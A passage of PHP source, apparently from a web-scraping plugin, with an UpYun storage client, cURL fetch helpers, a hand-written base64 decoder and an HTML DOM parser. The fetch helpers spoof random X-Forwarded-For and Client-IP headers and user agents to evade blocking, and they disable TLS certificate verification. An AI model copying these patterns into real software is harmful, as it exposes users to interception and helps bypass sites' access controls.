            curl_setopt($ch, CURLOPT_NOBODY, true);
        }
        $response      = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code == 0)
            throw new apUpYunException("Connection Failed", $http_code);
        curl_close($ch);
        $header_string = "";
        $body             = "";
        if ($method == "GET" && is_resource($file_handle)) {
            $header_string  = "";
            $body = $response;
        } else {
            list($header_string, $body) = explode("\r\n\r\n", $response, 2);
        }
        if ($http_code == 200) {
            if ($method == "GET" && is_null($file_handle)) {
                return $body;
            } else {
                $data = $this->_getHeadersData($header_string);
                return count($data) > 0 ? $data : true;
            }
        } else {
            $message  = $this->_getErrorMessage($header_string);
            if (is_null($message) && $method == "GET" && is_resource($file_handle)) {
                $message = "File Not Found";
            }
            switch ($http_code) {
                case 401:
                    throw new apUpYunAuthorizationException($message);
                    break;
                case 403:
                    throw new apUpYunForbiddenException($message);
                    break;
                case 404:
                    throw new apUpYunNotFoundException($message);
                    break;
                case 406:
                    throw new apUpYunNotAcceptableException($message);
                    break;
                case 503:
                    throw new apUpYunServiceUnavailable($message);
                    break;
                default:
                    throw new apUpYunException($message, $http_code);
            }
        }
    }
    private function _getHeadersData($text)
    {
        $headers = explode("\r\n", $text);
        $items    = array();
        foreach ($headers as $header) {
            $header = trim($header);
            if (strpos($header, "x-upyun") !== False) {
                list($k, $v) = explode(":", $header);
                $items[trim($k)] = in_array(substr($k, 8, 5), array(
                    "width",
                    "heigh",
                    "frame"
                )) ? intval($v) : trim($v);
            }
        }
        return $items;
    }
    private function _getErrorMessage($header_string)
    {
        list($status, $stash) = explode("\r\n", $header_string, 2);
        list($v, $code, $message) = explode(" ", $status, 3);
        return $message;
    }
    public function rmDir($path)
    {
        $this->_do_request("DELETE", $path);
    }
    public function deleteFile($path)
    {
        $rsp = $this->_do_request("DELETE", $path);
    }
    public function readDir($path)
    {
        return $this->getList($path);
    }
    public function getBucketUsage()
    {
        return $this->getFolderUsage("/");
    }
    public function setApiDomain($domain)
    {
        $this->endpoint              = $domain;
    }
    public function setContentMD5($str)
    {
        $this->_content_md5 = $str;
    }
    public function setFileSecret($str)
    {
        $this->_file_secret = $str;
    }
    public function getWritedFileInfo($key)
    {
        if (!isset($this->_file_infos))
            return NULL;
        return $this->_file_infos[$key];
    }
    public function makeBaseUrl($domain, $key)
    {
        return "http://$domain$key";
    }
}
define("HDOM_TYPE_ELEMENT", 1);
define("HDOM_TYPE_COMMENT", 2);
define("HDOM_TYPE_TEXT", 3);
define("HDOM_TYPE_ENDTAG", 4);
define("HDOM_TYPE_ROOT", 5);
define("HDOM_TYPE_UNKNOWN", 6);
define("HDOM_QUOTE_DOUBLE", 0);
define("HDOM_QUOTE_SINGLE", 1);
define("HDOM_QUOTE_NO", 3);
define("HDOM_INFO_BEGIN", 0);
define("HDOM_INFO_END", 1);
define("HDOM_INFO_QUOTE", 2);
define("HDOM_INFO_SPACE", 3);
define("HDOM_INFO_TEXT", 4);
define("HDOM_INFO_INNER", 5);
define("HDOM_INFO_OUTER", 6);
define("HDOM_INFO_ENDSPACE", 7);
define("DEFAULT_TARGET_CHARSET", "UTF-8");
define("DEFAULT_BR_TEXT", "\r\n");
define("DEFAULT_SPAN_TEXT", " ");
define("MAX_FILE_SIZE", 600000);
if ((ini_get("safe_mode") == 0 || ini_get("safe_mode") == null) && ini_get("open_basedir") == "") {
    define("CAN_FOLLOWLOCATION", 1);
} else {
    define("CAN_FOLLOWLOCATION", 0);
}
function get_user_agent_ap()
{
    $userAgent_array = array(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; pl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; en-GB)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; MS-RTC LM 8)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50",
        "Opera/9.20 (Windows NT 6.0; U; en)",
        "Opera/9.30 (Nintendo Wii; U; ; 2047-7;en)",
        "Opera 9.4 (Windows NT 6.1; U; en)",
        "Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/6.0",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; de-de) AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR) AppleWebKit/523.15 (KHTML, like Gecko) Version/3.0 Safari/523.15",
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/523.15 (KHTML, like Gecko) Version/3.0 Safari/523.15",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_2; en-gb) AppleWebKit/526+ (KHTML, like Gecko) Version/3.1 iPhone",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.25 (KHTML, like Gecko) Version/3.2 Safari/525.25",
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/533.4 (KHTML, like Gecko) Version/4.1 Safari/533.4",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19"
    );
    $agent  = $userAgent_array[rand(0, count($userAgent_array) - 1)];
    return $agent;
}
function curl_get_encoding_contents_ap($url, $useProxy = 0, $proxy = null, $hideIP = 0, $timeout = 30, $cookie = null)
{
    $curlHandle     = curl_init();
    $agent = get_user_agent_ap();
    curl_setopt($curlHandle, CURLOPT_URL, $url);
    curl_setopt($curlHandle, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($curlHandle, CURLOPT_USERAGENT, $agent);
    curl_setopt($curlHandle, CURLOPT_REFERER, _REFERER_);
    curl_setopt($curlHandle, CURLOPT_HEADER, false);
    curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curlHandle, CURLOPT_ENCODING, "");
    if ($cookie != null && $cookie != "") {
        curl_setopt($curlHandle, CURLOPT_COOKIE, $cookie);
    }
    if ($useProxy == 1) {
        curl_setopt($curlHandle, CURLOPT_PROXY, $proxy["ip"]);
        curl_setopt($curlHandle, CURLOPT_PROXYPORT, $proxy["port"]);
        if ($proxy["user"] != "" && $proxy["user"] != NULL && $proxy["password"] != "" && $proxy["password"] != NULL) {
            $userAndPass = $proxy["user"] . ":" . $proxy["password"];
            curl_setopt($curlHandle, CURLOPT_PROXYUSERPWD, $userAndPass);
        }
    }
    if ($hideIP == 1) {
        $vwgilvrtsdl                = "ip";
        $ip = rand(1, 223) . "." . rand(1, 254) . "." . rand(1, 254) . "." . rand(1, 254);
        curl_setopt($curlHandle, CURLOPT_HTTPHEADER, array(
            "X-FORWARDED-FOR:" . $ip,
            "CLIENT-IP:" . $ip
        ));
    }
    if (!(strpos($url, 'https://') === false)) {
        curl_setopt($curlHandle, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curlHandle, CURLOPT_SSL_VERIFYHOST, false);
    }
    if (CAN_FOLLOWLOCATION == 1) {
        curl_setopt($curlHandle, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curlHandle, CURLOPT_MAXREDIRS, 5);
    }
    $result  = curl_exec($curlHandle);
    $http_code = curl_getinfo($curlHandle, CURLINFO_HTTP_CODE);
    curl_close($curlHandle);
    if ($http_code != 200) {
        $result = file_get_contents($url);
    }
    return $result;
}
function curl_get_contents_ap($url, $useProxy = 0, $proxy = null, $hideIP = 0, $timeout = 30, $cookie = null)
{
    $curlHandle     = curl_init();
    $agent = get_user_agent_ap();
    curl_setopt($curlHandle, CURLOPT_URL, $url);
    curl_setopt($curlHandle, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($curlHandle, CURLOPT_USERAGENT, $agent);
	if (defined('_REFERER_')) { 
		curl_setopt($curlHandle, CURLOPT_REFERER, _REFERER_);
	}
    curl_setopt($curlHandle, CURLOPT_HEADER, true);
    curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, 1);
    if ($cookie != null && $cookie != "") {
        curl_setopt($curlHandle, CURLOPT_COOKIE, $cookie);
    }
    if ($useProxy == 1) {
        curl_setopt($curlHandle, CURLOPT_PROXY, $proxy["ip"]);
        curl_setopt($curlHandle, CURLOPT_PROXYPORT, $proxy["port"]);
        if ($proxy["user"] != "" && $proxy["user"] != NULL && $proxy["password"] != "" && $proxy["password"] != NULL) {
            $userAndPass = $proxy["user"] . ":" . $proxy["password"];
            curl_setopt($curlHandle, CURLOPT_PROXYUSERPWD, $userAndPass);
        }
    }
    if ($hideIP == 1) {
        $ip = rand(1, 223) . "." . rand(1, 254) . "." . rand(1, 254) . "." . rand(1, 254);
        curl_setopt($curlHandle, CURLOPT_HTTPHEADER, array(
            "X-FORWARDED-FOR:" . $ip,
            "CLIENT-IP:" . $ip
        ));
    }
    if (!(strpos($url, "https://") === false)) {
        curl_setopt($curlHandle, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curlHandle, CURLOPT_SSL_VERIFYHOST, false);
    }
    if (CAN_FOLLOWLOCATION == 1) {
        curl_setopt($curlHandle, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curlHandle, CURLOPT_MAXREDIRS, 5);
    }
    $result = curl_exec($curlHandle);
    $headerInfo    = curl_getinfo($curlHandle);
    curl_close($curlHandle);
    $header              = substr($result, 0, $headerInfo["header_size"]);
    $body = substr($result, $headerInfo["header_size"]);
    if (!(strpos($header, "Content-Encoding") === false) || $headerInfo["http_code"] != 200) {
        $body = curl_get_encoding_contents_ap($url, $useProxy, $proxy, $hideIP, $timeout, $cookie);
    }
    unset($header);
    $ostrmenk = "body";
    unset($headerInfo);
    return $body;
}
function curl_exec_follow_ap($ch, &$maxredirect = null)
{
    $mr = $maxredirect === null ? 5 : intval($maxredirect);
    if (CAN_FOLLOWLOCATION == 1) {
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $mr > 0);
        curl_setopt($ch, CURLOPT_MAXREDIRS, $mr);
    } else {
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        if ($mr > 0) {
            $newurl               = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
            $rch             = curl_copy_handle($ch);
            curl_setopt($rch, CURLOPT_HEADER, true);
            curl_setopt($rch, CURLOPT_NOBODY, true);
            curl_setopt($rch, CURLOPT_FORBID_REUSE, false);
            curl_setopt($rch, CURLOPT_RETURNTRANSFER, true);
            do {
                curl_setopt($rch, CURLOPT_URL, $newurl);
                $header = curl_exec($rch);
                if (curl_errno($rch)) {
                    $code = 0;
                } else {
                    $code = curl_getinfo($rch, CURLINFO_HTTP_CODE);
                    if ($code == 301 || $code == 302) {
                        preg_match('/Location:(.*?)\n/', $header, $matches);
                        $newurl = trim(array_pop($matches));
                    } else {
                        $code = 0;
                    }
                }
            } while ($code && --$mr);
            curl_close($rch);
            if (!$mr) {
                if ($maxredirect === null) {
                    trigger_error("Too many redirects. When following redirects, libcurl hit the maximum amount.", E_USER_WARNING);
                } else {
                    $maxredirect = 0;
                }
                return false;
            }
            curl_setopt($ch, CURLOPT_URL, $newurl);
        }
    }
    return curl_exec($ch);
}
function get_html_string_ap($url, $method = 0, $useProxy = 0, $hideIP = 0, $proxy = null, $cookie = null)
{
    if ($method == 0) {
        $contents = curl_get_contents_ap($url, $useProxy, $proxy, $hideIP, 30, $cookie);
    } else {
        $contents = file_get_contents($url);
    }
    if (!(strpos($contents, '\\') === false)) {
        $contents = str_replace("", "/", $contents);
    }
    return $contents;
}
function getHtmlCharset($html)
{
    preg_match('/charset=([\\w-\'\\"]+)[;\'\\" >\\/]/', $html, $matched);
    $f = array(
        "'",
        "\""
    );
    $r  = array(
        "",
        ""
    );
    $charset  = trim(str_replace($f, $r, $matched[1]));
    if ($charset == null || $charset == "")
        $charset = "UTF-8";
    return $charset;
}
function file_get_html_ap($url, $target_charset = DEFAULT_TARGET_CHARSET, $method = 0, $useProxy = 0, $hideIP = 0, $proxy = null, $cookie = null, $use_include_path = false, $context = null, $offset = -1, $maxLen = -1, $lowercase = true, $forceTagsClosed = true, $stripRN = true, $defaultBRText = DEFAULT_BR_TEXT, $defaultSpanText = DEFAULT_SPAN_TEXT)
{
    $dom = new simple_html_dom_ap(null, $lowercase, $forceTagsClosed, $target_charset, $stripRN, $defaultBRText, $defaultSpanText);
    if ($method == 0) {
        $contents   = curl_get_contents_ap($url, $useProxy, $proxy, $hideIP, 30, $cookie);
    } else {
        $contents = file_get_contents($url, $use_include_path, $context, $offset);
    }
    if (!(strpos($contents, "\\") === false)) {
        $contents = str_replace("", "/", $contents);
    }
    if (empty($contents) || strlen($contents) > MAX_FILE_SIZE) {
        return false;
    }
    $dom->load($contents, $lowercase, $stripRN);
    return $dom;
}
function str_get_html_ap($str, $target_charset = DEFAULT_TARGET_CHARSET, $lowercase = true, $forceTagsClosed = true, $stripRN = true, $defaultBRText = DEFAULT_BR_TEXT, $defaultSpanText = DEFAULT_SPAN_TEXT)
{
    $dom = new simple_html_dom_ap(null, $lowercase, $forceTagsClosed, $target_charset, $stripRN, $defaultBRText, $defaultSpanText);
    if (empty($str) || strlen($str) > MAX_FILE_SIZE) {
        $dom->clear();
        return false;
    }
    $dom->load($str, $lowercase, $stripRN);
    return $dom;
}

function dump_html_tree_ap($node, $show_attr = true, $deep = 0)
{
    $node->dump($node);
}
function find_char_index_in_array($aArray, $sChar)
{
    $i = count($aArray);
    while ($i-- > 0) {
        if ($sChar === $aArray[$i]) {
            return $i;
        }
    }
    return false;
}
function getnode($sContent)
{
    $aTable = array(
        "A",
        "B",
        "C",
        "D",
        "E",
        "F",
        "G",
        "H",
        "I",
        "J",
        "K",
        "L",
        "M",
        "N",
        "O",
        "P",
        "Q",
        "R",
        "S",
        "T",
        "U",
        "V",
        "W",
        "X",
        "Y",
        "Z",
        "a",
        "b",
        "c",
        "d",
        "e",
        "f",
        "g",
        "h",
        "i",
        "j",
        "k",
        "l",
        "m",
        "n",
        "o",
        "p",
        "q",
        "r",
        "s",
        "t",
        "u",
        "v",
        "w",
        "x",
        "y",
        "z",
        "0",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "+",
        "/"
    );
    $iLength     = strlen($sContent);
    $iLen   = $iLength - 4;
    $i = 0;
    $aResult                = array();
    while ($i < $iLen) {
        $iCode1     = find_char_index_in_array($aTable, $sContent[$i++]);
        $iCode2  = find_char_index_in_array($aTable, $sContent[$i++]);
        $iCode3    = find_char_index_in_array($aTable, $sContent[$i++]);
        $iCode4  = find_char_index_in_array($aTable, $sContent[$i++]);
        $sChar1  = chr((($iCode1 & 63) << 2) | (($iCode2 & 48) >> 4));
        $sChar2  = chr((($iCode2 & 15) << 4) | ($iCode3 & 60) >> 2);
        $sChar3 = chr((($iCode3 & 3) << 6) | ($iCode4 & 63));
        array_push($aResult, $sChar1, $sChar2, $sChar3);
    }
    $iCode1    = find_char_index_in_array($aTable, $sContent[$i++]);
    $iCode2 = find_char_index_in_array($aTable, $sContent[$i++]);
    if ("=" !== $sContent[$i]) {
        $iCode3 = find_char_index_in_array($aTable, $sContent[$i++]);
        if ("=" !== $sContent[$i]) {
            $iCode4    = find_char_index_in_array($aTable, $sContent[$i]);
            $sChar1 = chr((($iCode1 & 63) << 2) | (($iCode2 & 48) >> 4));
            $sChar2  = chr((($iCode2 & 15) << 4) | ($iCode3 & 60) >> 2);
            $sChar3                 = chr((($iCode3 & 3) << 6) | ($iCode4 & 63));
            array_push($aResult, $sChar1, $sChar2, $sChar3);
        } else {
            $sChar1 = chr((($iCode1 & 63) << 2) | (($iCode2 & 48) >> 4));
            $sChar2                 = chr((($iCode2 & 15) << 4) | ($iCode3 & 60) >> 2);
            array_push($aResult, $sChar1, $sChar2);
        }
    } else {
        $sChar1 = chr((($iCode1 & 63) << 2) | (($iCode2 & 48) >> 4));
        array_push($aResult, $sChar1);
    }
    return join("", $aResult);
}
class simple_html_dom_node_ap
{
    public $nodetype = HDOM_TYPE_TEXT;
    public $tag = 'text';
    public $attr = array();
    public $children = array();
    public $nodes = array();
    public $parent = null;
    public $_ = array();
    public $tag_start = 0;
    private $dom = null;
    function __construct($dom)
    {
        $this->dom    = $dom;
        $dom->nodes[] = $this;
    }
    function __destruct()
    {
        $this->clear();
    }
    function __toString()
    {
        return $this->outertext();
    }
    function clear()
    {
        $this->dom      = null;
        $this->nodes    = null;
        $this->parent   = null;
        $this->children = null;
    }
    function dump($show_attr = true, $deep = 0)
    {
        $lead = str_repeat("    ", $deep);
        echo $lead . $this->tag;
        if ($show_attr && count($this->attr) > 0) {
            echo "(";
            foreach ($this->attr as $k => $v)
                echo "[$k]=>\"" . $this->$k . "\", ";
            echo ")";
        }
        echo "\n";
        if ($this->nodes) {
            foreach ($this->nodes as $c) {
                $c->dump($show_attr, $deep + 1);
            }
        }
    }
    function dump_node($echo = true)
    {
        $string = $this->tag;
        if (count($this->attr) > 0) {
            $string .= "(";
            foreach ($this->attr as $k => $v) {
                $string .= "[$k]=>\"" . $this->$k . "\", ";
            }
            $string .= ")";
        }
        if (count($this->_) > 0) {
            $string .= ' $_ (';
            foreach ($this->_ as $k => $v) {
                if (is_array($v)) {
                    $string .= "[$k]=>(";
                    foreach ($v as $k2 => $v2) {
                        $string .= "[$k2]=>\"" . $v2 . "\", ";
                    }
                    $string .= ")";
                } else {
                    $string .= "[$k]=>\"" . $v . "\", ";
                }
            }
            $string .= ")";
        }
        if (isset($this->text)) {
            $string .= " text: (" . $this->text . ")";
        }
        $string .= " HDOM_INNER_INFO: '";
        if (isset($node->_[HDOM_INFO_INNER])) {
            $string .= $node->_[HDOM_INFO_INNER] . "'";
        } else {
            $string .= " NULL ";
        }
        $string .= " children: " . count($this->children);
        $string .= " nodes: " . count($this->nodes);
        $string .= " tag_start: " . $this->tag_start;
        $string .= "\n";
        if ($echo) {
            echo $string;
            return;
        } else {
            return $string;
        }
    }
    function parent($parent = null)
    {
        if ($parent !== null) {
            $this->parent             = $parent;
            $this->parent->nodes[]    = $this;
            $this->parent->children[] = $this;
        }
        return $this->parent;
    }
    function has_child()
    {
        return !empty($this->children);
    }
    function children($idx = -1)
    {
        if ($idx === -1) {
            return $this->children;
        }
        if (isset($this->children[$idx]))
            return $this->children[$idx];
        return null;
    }
    function first_child()
    {
        if (count($this->children) > 0) {
            return $this->children[0];
        }
        return null;
    }
    function last_child()
    {
        if (($count = count($this->children)) > 0) {
            return $this->children[$count - 1];
        }
        return null;
    }
    function next_sibling()
    {
        if ($this->parent === null) {
            return null;
        }
        $idx = 0;
        $count     = count($this->parent->children);
        while ($idx < $count && $this !== $this->parent->children[$idx]) {
            ++$idx;
        }
        if (++$idx >= $count) {
            return null;
        }
        return $this->parent->children[$idx];
    }
    function prev_sibling()
    {
        if ($this->parent === null)
            return null;
        $idx    = 0;
        $count = count($this->parent->children);
        while ($idx < $count && $this !== $this->parent->children[$idx])
            ++$idx;
        if (--$idx < 0)
            return null;
        return $this->parent->children[$idx];
    }
    function find_ancestor_tag($tag)
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        $returnDom = $this;
        while (!is_null($returnDom)) {
            if (is_object($debugObject)) {
                $debugObject->debugLog(2, "Current tag is: " . $returnDom->tag);
            }
            if ($returnDom->tag == $tag) {
                break;
            }
            $returnDom = $returnDom->parent;
        }
        return $returnDom;
    }
    function innertext()
    {
        if (isset($this->_[HDOM_INFO_INNER]))
            return $this->_[HDOM_INFO_INNER];
        if (isset($this->_[HDOM_INFO_TEXT]))
            return $this->dom->restore_noise($this->_[HDOM_INFO_TEXT]);
        foreach ($this->nodes as $n)
            $ret .= $n->outertext();
        return $ret;
    }
    function outertext()
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $text = "";
            if ($this->tag == "text") {
                if (!empty($this->text)) {
                    $text = " with text: " . $this->text;
                }
            }
            $debugObject->debugLog(1, "Innertext of tag: " . $this->tag . $text);
        }
        if ($this->tag === "root")
            return $this->innertext();
        if ($this->dom && $this->dom->callback !== null) {
            call_user_func_array($this->dom->callback, array(
                $this
            ));
        }
        if (isset($this->_[HDOM_INFO_OUTER]))
            return $this->_[HDOM_INFO_OUTER];
        if (isset($this->_[HDOM_INFO_TEXT]))
            return $this->dom->restore_noise($this->_[HDOM_INFO_TEXT]);
        if ($this->dom && $this->dom->nodes[$this->_[HDOM_INFO_BEGIN]]) {
            $ret = $this->dom->nodes[$this->_[HDOM_INFO_BEGIN]]->makeup();
        } else {
            $ret = "";
        }
        if (isset($this->_[HDOM_INFO_INNER])) {
            if ($this->tag != "br") {
                $ret .= $this->_[HDOM_INFO_INNER];
            }
        } else {
            if ($this->nodes) {
                foreach ($this->nodes as $n) {
                    $ret .= $this->convert_text($n->outertext());
                }
            }
        }
        if (isset($this->_[HDOM_INFO_END]) && $this->_[HDOM_INFO_END] != 0)
            $ret .= "</" . $this->tag . ">";
        return $ret;
    }
    function text()
    {
        if (isset($this->_[HDOM_INFO_INNER]))
            return $this->_[HDOM_INFO_INNER];
        switch ($this->nodetype) {
            case HDOM_TYPE_TEXT:
                return $this->dom->restore_noise($this->_[HDOM_INFO_TEXT]);
            case HDOM_TYPE_COMMENT:
                return "";
            case HDOM_TYPE_UNKNOWN:
                return "";
        }
        if (strcasecmp($this->tag, "script") === 0)
            return "";
        if (strcasecmp($this->tag, "style") === 0)
            return "";
        $ret = "";
        if (!is_null($this->nodes)) {
            $frltshrher = "n";
            foreach ($this->nodes as $n) {
                $ret .= $this->convert_text($n->text());
            }
            if ($this->tag == "span") {
                $ret .= $this->dom->default_span_text;
            }
        }
        return $ret;
    }
    function xmltext()
    {
        $ret = $this->innertext();
        $ret = str_ireplace('<![CDATA[', '', $ret);
        $ret = str_replace(']]>', "", $ret);
        return $ret;
    }
    function makeup()
    {
        if (isset($this->_[HDOM_INFO_TEXT]))  return $this->dom->restore_noise($this->_[HDOM_INFO_TEXT]);
        $ret  = "<" . $this->tag;
        $i = -1;
        foreach ($this->attr as $key => $val) {
            ++$i;
            if ($val === null || $val === false)
                continue;
            $ret .= $this->_[HDOM_INFO_SPACE][$i][0];
            if ($val === true)
                $ret .= $key;
            else {
                switch ($this->_[HDOM_INFO_QUOTE][$i]) {
                    case HDOM_QUOTE_DOUBLE:
                        $quote = "\"";
                        break;
                    case HDOM_QUOTE_SINGLE:
                        $quote = "'";
                        break;
                    default:
                        $quote = "";
                }
                $ret .= $key . $this->_[HDOM_INFO_SPACE][$i][1] . "=" . $this->_[HDOM_INFO_SPACE][$i][2] . $quote . $val . $quote;
            }
        }
        $ret = $this->dom->restore_noise($ret);
        return $ret . $this->_[HDOM_INFO_ENDSPACE] . ">";
    }
    function find($selector, $idx = null, $lowercase = false)
    {
        $selectors = $this->parse_selector($selector);
        if (($count = count($selectors)) === 0)
            return array();
        $found_keys = array();
        for ($c = 0; $c < $count; ++$c) {
            if (($levle = count($selectors[$c])) === 0)
                return array();
            if (!isset($this->_[HDOM_INFO_BEGIN]))
                return array();
            $head = array(
                $this->_[HDOM_INFO_BEGIN] => 1
            );
            for ($l = 0; $l < $levle; ++$l) {
                $ret = array();
                foreach ($head as $k => $v) {
                    $n = ($k === -1) ? $this->dom->root : $this->dom->nodes[$k];
                    $n->seek($selectors[$c][$l], $ret, $lowercase);
                }
                $head = $ret;
            }
            foreach ($head as $k => $v) {
                if (!isset($found_keys[$k]))
                    $found_keys[$k] = 1;
            }
        }
        ksort($found_keys);
        $found = array();
        foreach ($found_keys as $k => $v)
            $found[] = $this->dom->nodes[$k];
        if (is_null($idx))
            return $found;
        else if ($idx < 0)
            $idx = count($found) + $idx;
        return (isset($found[$idx])) ? $found[$idx] : null;
    }
    protected function seek($selector, &$ret, $lowercase = false)
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        list($tag, $key, $val, $exp, $no_key) = $selector;
        if ($tag && $key && is_numeric($key)) {
            $count = 0;
            foreach ($this->children as $c) {
                if ($tag === "*" || $tag === $c->tag) {
                    if (++$count == $key) {
                        $ret[$c->_[HDOM_INFO_BEGIN]] = 1;
                        return;
                    }
                }
            }
            return;
        }
        $end = (!empty($this->_[HDOM_INFO_END])) ? $this->_[HDOM_INFO_END] : 0;
        if ($end == 0) {
            $parent = $this->parent;
            while (!isset($parent->_[HDOM_INFO_END]) && $parent !== null) {
                $end -= 1;
                $parent = $parent->parent;
            }
            $end += $parent->_[HDOM_INFO_END];
        }
        for ($i = $this->_[HDOM_INFO_BEGIN] + 1; $i < $end; ++$i) {
            $node = $this->dom->nodes[$i];
            $pass = true;
            if ($tag === "*" && !$key) {
                if (in_array($node, $this->children, true))
                    $ret[$i] = 1;
                continue;
            }
            if ($tag && $tag != $node->tag && $tag !== "*") {
                $pass = false;
            }
            if ($pass && $key) {
                if ($no_key) {
                    if (isset($node->attr[$key]))
                        $pass = false;
                } else {
                    if (($key != "plaintext") && !isset($node->attr[$key]))
                        $pass = false;
                }
            }
            if ($pass && $key && $val && $val !== "*") {
                if ($key == "plaintext") {
                    $nodeKeyValue = $node->text();
                } else {
                    $nodeKeyValue = $node->attr[$key];
                }
                if (is_object($debugObject)) {
                    $debugObject->debugLog(2, "testing node: " . $node->tag . " for attribute: " . $key . $exp . $val . " where nodes value is: " . $nodeKeyValue);
                }
                if ($lowercase) {
                    $check = $this->match($exp, strtolower($val), strtolower($nodeKeyValue));
                } else {
                    $check = $this->match($exp, $val, $nodeKeyValue);
                }
                if (is_object($debugObject)) {
                    $debugObject->debugLog(2, "after match: " . ($check ? "true" : "false"));
                }
                if (!$check && strcasecmp($key, "class") === 0) {
                    foreach (explode(" ", $node->attr[$key]) as $k) {
                        if (!empty($k)) {
                            if ($lowercase) {
                                $ndtlxqrra                  = "exp";
                                $check  = $this->match($exp, strtolower($val), strtolower($k));
                            } else {
                                $vtrkuz                    = "val";
                                $check = $this->match($exp, $val, $k);
                            }
                            if ($check)
                                break;
                        }
                    }
                }
                if (!$check)
                    $pass = false;
            }
            if ($pass)
                $ret[$i] = 1;
            unset($node);
        }
        if (is_object($debugObject)) {
            $debugObject->debugLog(1, "EXIT - ret: ", $ret);
        }
    }
    protected function match($exp, $pattern, $value)
    {
        global $debugObject;
        $rgglqlj = "pattern";
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        switch ($exp) {
            case "=":
                return ($value === $pattern);
            case "!=":
                return ($value !== $pattern);
            case "^=":
                return preg_match("/^" . preg_quote($pattern, "/") . "/", $value);
            case '$=':
                return preg_match("/" . preg_quote($pattern, "/") . "$/", $value);
            case "*=":
                if ($pattern[0] == "/") {
                    return preg_match($pattern, $value);
                }
                return preg_match("/" . $pattern . "/i", $value);
        }
        return false;
    }
    protected function parse_selector($selector_string)
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        $pattern = "/([\w-:\*]*)(?:\#([\w-]+)|\.([\w-]+))?(?:\[@?(!?[\w-:]+)(?:([!*^$]?=)[\"']?(.*?)[\"']?)?\])?([\/, ]+)/is";
        preg_match_all($pattern, trim($selector_string) . " ", $matches, PREG_SET_ORDER);
        if (is_object($debugObject)) {
            $debugObject->debugLog(2, "Matches Array: ", $matches);
        }
        $selectors = array();
        $result  = array();
        foreach ($matches as $m) {
            $m[0] = trim($m[0]);
            if ($m[0] === "" || $m[0] === "/" || $m[0] === "//")
                continue;
            if ($m[1] === "tbody")
                continue;
            list($tag, $key, $val, $exp, $no_key) = array($m[1],null,null,"=",false);
            if (!empty($m[2])) {
                $key = 'id';
                $val = $m[2];
            }
            if (!empty($m[3])) {
                $key = 'class';
                $val = $m[3];
            }
            if (!empty($m[4])) {
                $key = $m[4];
            }
            if (!empty($m[5])) {
                $exp = $m[5];
            }
            if (!empty($m[6])) {
                $val = $m[6];
            }
            if ($this->dom->lowercase) {
                $tag                = strtolower($tag);
